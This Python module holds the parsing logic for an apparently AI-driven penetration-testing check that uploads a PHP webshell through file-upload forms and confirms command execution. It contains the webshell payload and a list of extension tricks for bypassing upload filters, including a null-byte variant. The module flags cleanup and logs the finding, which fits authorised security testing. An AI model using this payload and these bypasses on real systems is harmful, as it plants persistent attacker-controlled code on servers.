"""
Pure parsing logic for the file-upload webshell check.
No I/O here -- see execute.py.
"""
from __future__ import annotations

import urllib.parse
from dataclasses import dataclass, field
from html.parser import HTMLParser
from typing import Any, Dict, List, Optional, Tuple

# Hard cap on upload POSTs per call. Each bypass variant is one POST; the
# trigger GET used to confirm execution is separate and only runs after an
# upload is echoed back.
BYPASS_EXTENSIONS: List[str] = [
    ".php",
    ".php5",
    ".phtml",
    ".php.jpg",
    ".PHp",
    "%00.php",
]
MAX_UPLOAD_ATTEMPTS = len(BYPASS_EXTENSIONS)

BASE_FILENAME = "shell"
WEBSHELL_CONTENT = "<?php system($_GET['cmd'] ?? 'whoami'); ?>"
WEBSHELL_MIME = "application/x-php"
EXECUTION_PROBE_PARAM = "cmd"
EXECUTION_PROBE_VALUE = "id"
EXECUTION_MARKER = "uid="


@dataclass
class UploadForm:
    action_url: str
    file_field: str = "file"
    hidden: Dict[str, str] = field(default_factory=dict)


class _UploadFormParser(HTMLParser):
    def __init__(self, base_url: str) -> None:
        super().__init__()
        self.base_url = base_url
        self.form: Optional[UploadForm] = None
        self._in_form = False
        self._form_action = ""
        self._form_hidden: Dict[str, str] = {}
        self._form_file_field: Optional[str] = None

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        if self.form is not None:
            return
        tag = tag.lower()
        attr = {k.lower(): (v or "") for k, v in attrs}
        if tag == "form":
            self._in_form = True
            action = attr.get("action", "")
            self._form_action = urllib.parse.urljoin(self.base_url, action) if action else self.base_url
            self._form_hidden = {}
            self._form_file_field = None
        elif self._in_form and tag == "input":
            itype = attr.get("type", "text").lower()
            name = attr.get("name", "")
            if not name:
                return
            if itype == "file" and self._form_file_field is None:
                self._form_file_field = name
            elif itype == "hidden":
                self._form_hidden[name] = attr.get("value", "")

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form" and self._in_form:
            if self._form_file_field is not None and self.form is None:
                self.form = UploadForm(
                    action_url=self._form_action,
                    file_field=self._form_file_field,
                    hidden=dict(self._form_hidden),
                )
            self._in_form = False


def find_upload_form(html: str, base_url: str) -> Optional[UploadForm]:
    """First <form> containing an <input type="file">, with its action URL,
    that file input's name, and the form's hidden fields. None if no form."""
    if not html:
        return None
    parser = _UploadFormParser(base_url=base_url)
    try:
        parser.feed(html)
        parser.close()
    except Exception:
        return None
    return parser.form


def extract_upload_path(response_text: str, filename: str) -> str:
    """Best-effort server path for an uploaded file, from the upload
    response body. Falls back to the conventional /uploads/<filename>."""
    path_heuristic = f"/uploads/{filename}"
    for line in response_text.splitlines():
        if filename in line and "/" in line:
            for chunk in line.split('"'):
                if filename in chunk and chunk.startswith("/"):
                    return chunk
    return path_heuristic


def execution_confirmed(status_code: int, body: str) -> bool:
    """The planted file actually ran: the probe command's real output
    (uid=...) came back, not just an echoed filename."""
    return status_code == 200 and EXECUTION_MARKER in body


def parse_result(raw: Dict[str, Any]) -> Dict[str, Any]:
    """Turn execute()'s raw dict into the model-facing result.

    A confirmed plant puts the planted path at the TOP LEVEL, with a loud
    ALERT string, so the model cannot miss it or bury it in a nested
    field. Accepted-but-unconfirmed uploads are also listed (they may sit
    on the server too), with cleanup flagged.
    """
    target = raw.get("target", "")
    accepted = raw.get("accepted_uploads", [])
    if raw.get("error") and not accepted and not raw.get("planted"):
        return {"target": target, "planted": False, "upload_attempts": raw.get("upload_attempts", 0),
                "error": raw["error"]}

    result: Dict[str, Any] = {
        "target": target,
        "planted": bool(raw.get("planted")),
        "upload_attempts": raw.get("upload_attempts", 0),
    }
    if raw.get("error"):
        result["error"] = raw["error"]

    if accepted:
        result["accepted_uploads"] = accepted
        result["cleanup_required"] = True

    if raw.get("planted"):
        path = raw["planted_path"]
        url = raw["planted_url"]
        result.update({
            "planted_path": path,
            "planted_url": url,
            "bypass_used": raw.get("bypass_used"),
            "execution_output": raw.get("execution_output", ""),
            "cleanup_required": True,
            "ALERT": (
                f"WEBSHELL PLANTED AND EXECUTED on {target}: the file at path '{path}' "
                f"(URL {url}) is now persistent attacker-controlled code on the target. "
                f"Call log_finding immediately with this exact path so it is removed "
                f"during cleanup."
            ),
        })
    return result
